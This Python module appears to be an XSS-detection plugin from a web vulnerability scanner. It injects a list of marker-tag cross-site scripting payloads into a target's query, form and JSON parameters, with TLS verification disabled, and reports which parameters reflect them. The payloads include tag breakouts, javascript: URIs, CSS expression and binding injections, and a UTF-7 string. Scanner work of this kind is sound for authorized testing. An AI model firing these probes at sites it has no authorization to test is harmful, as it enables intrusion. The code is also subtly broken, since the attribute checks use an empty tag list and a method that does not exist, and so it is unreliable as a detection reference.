#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/fanxs-t/Shadow-Border


import bs4
from bs4 import BeautifulSoup as BS
import json
import re
import requests
import threading
from collections import OrderedDict
from scanner.utils.parsejson import JsonParser

# Refer to https://github.com/Q2h1Cg/xss_scan

poc_info = {
    'poc': {
        'Id': '',  # poc编号
        'Name': 'Cross Site Script (XSS)',  # poc名称
        'Author': 'Fanxs',  # poc作者
        'Create_date': '2019-01-16',  # poc创建时间：如'2014-11-19'
    },

    'vul': {
        'Product': 'Common',  # 漏洞所在产品名称
        'Version': '',  # 产品的版本号
        'Type': 'XSS',  # 漏洞类型
        'Severity': 'Low',
        'isWeb': True,
        'Description': '''
            Cross Site Scripting Attack.
            ''',
        'DisclosureDate': '',  # poc公布时间：如'2014-11-19'
    }
}


def poc(request):
    scan_result = {
        'Target': '',  # 目标URL
        'Error': '',  # 记录poc失败信息
        'Success': False,  # 是否执行成功，默认值为False表示poc执行不成功，若成功请更新该值为True
        'Ret': None  # 记录额外的poc相关信息
    }
    xss_scanner = XssScan(request)
    result = xss_scanner.scan()
    if xss_scanner.exception:
        scan_result["Error"] = xss_scanner.exception
    if result:
        scan_result['Target'] = request.url
        scan_result['Success'] = True
        scan_result['Ret'] = "\n\n".join(result)
    return scan_result


keyword = "duck8bi"
payloads = {
    "betweenCommonTag": ["<duck8bi>", "--><duck8bi>"],
    "betweenTitle": ["</title><duck8bi>"],
    "betweenTextarea": ["</textarea><duck8bi>"],
    "betweenXmp": ["</xmp><duck8bi>"],
    "betweenIframe": ["</iframe><duck8bi>"],
    "betweenNoscript": ["</noscript><duck8bi>"],
    "betweenNoframes": ["</noframes><duck8bi>"],
    "betweenPlaintext": ["</plaintext><duck8bi>"],
    "betweenScript": ["</script><duck8bi>", "\"duck8bi(1)", "'duck8bi(1)", "duck8bi(1)"],
    "betweenStyle": ["</style><duck8bi>", "1;x:expression(duck8bi)", "1;body{background:url(javascript:duck8bi)}",
                     "1;body{background-image:url(javascript:duck8bi)}",
                     "1;li{list-style-image:url(javascript:duck8bi)}",
                     "1;body{-moz-binding:url(http://duck8bi.com/1.xml)}", "1;html{behavior:url(1.htc)}",
                     "1;@import duck8bi",
                     "1;x:duck8bi"],
    "utf-7": ["+/v8 +ADw-duck8bi+AD4-"],
    "inMetaRefresh": ["javascript:duck8bi", "data:duck8bi", "duck8bi"],
    "inCommonAttr": ["\" duck8bi=x55", "' duck8bi=x55", " duck8bi=x55",
                     "\"><duck8bi>", "'><duck8bi>", "><duck8bi>"],
    "inSrcHrefAction": ["javascript:duck8bi", "data:duck8bi", "duck8bi"],
    "inScript": ["\"duck8bi", "'duck8bi", "duck8bi"],
    "inStyle": ["1;x:expression(duck8bi)", "1;background:url(javascript:duck8bi)",
                "1;background-image:url(javascript:duck8bi)", "1;list-style-image:url(javascript:duck8bi)",
                "1;-moz-binding:url(http://duck8bi.com/1.xml)", "1;behavior:url(1.htc)", "1;x:duck8bi"]
}


class Thread(threading.Thread):
    """ """

    def __init__(self, func, args):
        super(Thread, self).__init__()
        self.func = func
        self.args = args

    def run(self):
        self.func(*self.args)


class XssScan(object):
    """ """

    def __init__(self, request):
        self.url = request.url
        self.pure_url = request.protocol + "://" + request.host + ":" + request.port + request.path
        self.headers = json.loads(request.headers) if request.headers else dict()
        self.query = request.query
        self.params_dict = None
        self.method = request.method
        self.data = request.body
        self.data_dict = {}
        self.json_object = {}
        self.payloads = payloads
        self.exception = ''
        self.attack_units = {"betweenCommonTag": [], "betweenTitle": [], "betweenTextarea": [], "betweenXmp": [], "betweenIframe": [],
                             "betweenNoscript": [], "betweenNoframes": [], "betweenPlaintext": [], "betweenScript": [],
                             "betweenStyle": [], "utf-7": [], "inSrcHrefAction": [], "inScript": [],
                             "inStyle": [], "inCommonAttr": [], "inMetaRefresh": [] }
        self.result = []

    def scan(self):
        '''
        Start the scan:
            1. Get the char set
            2. Find all the arguments and tag those with potential vulnerabilities.
            3. Locate the potential vulnerabilities. Determine the DOM it is in.
            4. Start single payload test.
        :return: Result String
        '''
        self.get_charset()
        self.get_attack_surface()

        for i in self.attack_units.keys():
            if self.attack_units[i]:
                self.attack_units[i] = list(set(self.attack_units[i]))

        threads = [Thread(self.vul_verify, (test, location)) for location in self.attack_units for test in
                   self.attack_units[location]]

        for i in threads: i.start()
        for i in threads: i.join()
        return self.result

    @staticmethod
    def split_arguments(args):
        if not args:
            return dict()

        args_list = args.split("&")
        args_dict = OrderedDict()
        for p in args_list:
            if "=" not in p:
                args_dict[p] = ""
            elif p.endswith("="):
                para = p[:-1]
                args_dict[para] = ""
            else:
                para = p[:p.rindex("=")]
                value = p[p.rindex("=") + 1:]
                args_dict[para] = value
        return args_dict

    def get_attack_surface(self):
        """ """

        self.params_dict = self.split_arguments(self.query)
        self.json_object = JsonParser(self.data)
        if self.json_object.is_json is False:
            self.data_dict = self.split_arguments(self.data)

        threads = []
        for para in self.params_dict.keys():
            test = ("params", para)
            threads.append(Thread(self.potential_vul_verify, (test,)))
        for data in self.data_dict.keys():
            test = ("data", data)
            threads.append(Thread(self.potential_vul_verify, (test,)))
        for arg in self.json_object.args():
            test = ("json", arg)
            threads.append(Thread(self.potential_vul_verify, (test,)))
        for i in threads: i.start()
        for i in threads: i.join()

    def potential_vul_verify(self, test):
        """ """
        if test[0] == "params":
            params = self.params_dict.copy()
            params[test[1]] = keyword
            data = self.data_dict
            json = self.json_object.json
        elif test[0] == "data":
            data = self.data_dict.copy()
            data[test[1]] = keyword
            params = self.params_dict
            json = self.json_object.json
        else:
            json_object = self.json_object.copy()
            json_object[test[1]] = keyword
            json = json_object.json
            params = self.params_dict
            data = self.data_dict

        try:
            r = requests.request(self.method, self.pure_url, headers=self.headers, params=params, data=data, json=json, timeout=3, verify=False)
            html = r.text
            r.close()
        except Exception as e:
            self.exception += '[judge_out]' + str(e) + '\n'
            return
        else:
            if keyword in html:
                self.locate_potential_vul(test, html)

    def get_charset(self):
        """ """
        try:
            r = requests.request(self.method, self.url, data=self.data, headers=self.headers, timeout=3)
            soup = BS(r.text)
            r.close()
        except Exception as e:
            self.exception += '[get_charset]' + str(e) + '\n'
        else:
            try:
                if ("gb" in r.headers["content-type"].lower() or
                        ("utf" not in r.headers["content-type"].lower() and
                         bool(soup.meta) and "gb" in soup.meta["content"].lower())
                ):
                    self.enc = "gbk"
                else:
                    self.enc = "utf-8"
            except Exception as e:
                self.enc = "utf-8"

    def locate_potential_vul(self, test, html):
        """"""
        soup = BS(html)
        tagList = []
        self.get_children_tags(soup)

        re_key = re.compile(keyword)
        if soup.findAll(text=re_key):
            for i in soup.findAll(text=re_key):
                if i.findParent("title"):
                    self.attack_units["betweenTitle"].append(test)
                elif i.findParent("textarea"):
                    self.attack_units["betweenTextarea"].append(test)
                elif i.findParent("xmp"):
                    self.attack_units["betweenXmp"].append(test)
                elif i.findParent("iframe"):
                    self.attack_units["betweenIframe"].append(test)
                elif i.findParent("noscript"):
                    self.attack_units["betweenNoscript"].append(test)
                elif i.findParent("noframes"):
                    self.attack_units["betweenNoframes"].append(test)
                elif i.findParent("plaintext"):
                    self.attack_units["betweenPlaintext"].append(test)
                elif i.findParent("script"):
                    self.attack_units["betweenScript"].append(test)
                elif i.findParent("style"):
                    self.attack_units["betweenStyle"].append(test)
                else:
                    self.attack_units["betweenCommonTag"].append(test)

        if soup.findAll(name="meta", attrs={"http-equiv": "Refresh", "content": re.compile(keyword)}):
            self.attack_units["inMetaRefresh"].append(test)

        if html.startswith(keyword):
            self.attack_units["utf-7"].append(test)

        for i in tagList:
            for j in i.attrs:
                if keyword in i.attrs[j]:
                    self.attack_units["inCommonAttr"].append(test)
                    if j in ["src", "href", "action"]:
                        self.attack_units["inSrcHrefAction"].append(test)
                    elif (j.startswith("on") or (
                            j in ["src", "href", "action"] and i.attrs[j].startswith("javascript:"))):
                        self.attack_units["inScript"].append(test)
                    elif j == "style":
                        self.attack_units["inStyle"].append(test)

    def get_children_tags(self, tag):
        taglist = []
        for i in tag.children:
            if type(i) == bs4.element.Tag:
                taglist.append(i)
                taglist += self.get_children_tags(i)
        return taglist

    @staticmethod
    def confirm_parent_tag(soup):
        for i in soup.findAll(keyword):
            for j in i.parents:
                if j.name in ("title", "textarea", "xmp",
                              "iframe", "noscript", "noframes", "plaintext"):
                    return False
        return True

    def confirm_in_script(self, soup, payload):
        tagList = []
        self.getChildrenTags(soup, tagList)
        for i in tagList:
            for j in i.attrs:
                if j.startswith("on") and payload in i.attrs[j]:
                    return True
        return False

    def single_payload_verify(self, test, location, payload):
        """ """
        test_args = dict()
        if test[0] == "params":
            params = self.params_dict.copy()
            params[test[1]] = payload
            data = self.data_dict
            json = self.json_object.json
        elif test[0] == "data":
            data = self.data_dict.copy()
            data[test[1]] = payload
            params = self.params_dict
            json = self.json_object.json
        else:
            json_object = self.json_object.copy()
            json_object[test[1]] = payload
            json = json_object.json
            params = self.params_dict
            data = self.data_dict
        try:
            r = requests.request(self.method, self.pure_url, headers=self.headers, params=params, data=data, json=json, timeout=3, verify=False)
            html = r.text
            r.close()
        except Exception as e:
            self.exception += '[test_single_payload]' + str(e) + '\n'
            html = ""
        soup = BS(html)
        if (location in ("betweenCommonTag", "betweenTitle", "betweenTextarea",
                         "betweenXmp", "betweenIframe", "betweenNoscript", "betweenNoframes",
                         "betweenPlaintext")
                and soup.findAll(keyword) and self.confirm_parent_tag(soup)):
            self.result.append(
                "Payload : %s\nParams : " % payload + test[1])

        if (location == "betweenScript" and (soup.findAll(keyword)
                                             or soup.findAll(name="script", text=re.compile(
                    r"[^\\]%s" % payload.replace("(", "\(").replace(")", "\)")))
        )
        ):
            self.result.append(
                "Payload : %s\nParams : " % payload + test[1])

        if (location == "betweenScript" and self.enc == "gbk" and
                soup.findAll(name="script", text=re.compile(r"\\%s" % payload.replace("(", "\(").replace(")", "\)")))
        ):
            self.result.append(
                "[GBK] Payload : %s\nParams : " % payload + test[1])

        if (location == "betweenStyle" and (soup.findAll(keyword) or
                                            soup.findAll(name="style", text=re.compile(
                                                "%s" % payload.replace(".", "\.").replace("(", "\(").replace(")",
                                                                                                             "\)")))
        )
        ):
            self.result.append(
                "Payload : %s\nParams : " % payload + test[1])

        if (location == "inMetaRefresh" and soup.findAll(name="meta", attrs={"http-equiv": "Refresh",
                                                                             "content": re.compile(payload)})):
            self.result.append(
                "Payload : %s\nParams : " % payload + test[1])

        if location == "utf-7" and html.startswith("+/v8 +ADw-duck8bi+AD4-"):
            self.result.append(
                "Payload : %s\nParams : " % payload + test[1])

        if (location == "inCommonAttr" and (soup.findAll(keyword) or
                                            soup.findAll(attrs={keyword: re.compile("x55")}))
        ):
            self.result.append(
                "Payload : %s\nParams : " % payload + test[1])

        if (location == "inSrcHrefAction" and (soup.findAll(attrs={"src": re.compile("%s" % payload)})
                                               or soup.findAll(attrs={"href": re.compile("%s" % payload)})
                                               or soup.findAll(attrs={"action": re.compile("%s" % payload)}))
        ):
            self.result.append(
                "Payload : %s\nParams : " % payload + test[1])

        if (location == "inScript" and self.confirm_in_script(soup, payload)):
            self.result.append(
                "Payload : %s\nParams : " % payload + test[1])

        if (location == "inStyle" and
                soup.findAll(attrs={
                    "style": re.compile("%s" % payload.replace(".", "\.").replace("(", "\(").replace(")", "\)"))})
        ):
            self.result.append(
                "Payload : %s\nParams : " % payload + test[1])

    def vul_verify(self, test, location):
        """ """
        threads = []
        for i in self.payloads[location]:
            threads.append(Thread(self.single_payload_verify, (test, location, i)))
        for i in threads:
            i.start()
        for i in threads:
            i.join()


if __name__ == "__main__":
    from lib.redisopt import redisCli
    from lib.config import load_config
    from lib.scanner.request import Request

    ''''''
    load_config()
    redisCli.build_connection()
    r = Request(redisCli.retrieve_request(b"7554697de81997581ca6e5bcfc850cd6"))
    xss_scanner = XssScan(r)
    result = xss_scanner.scan()
    print(result)

    #
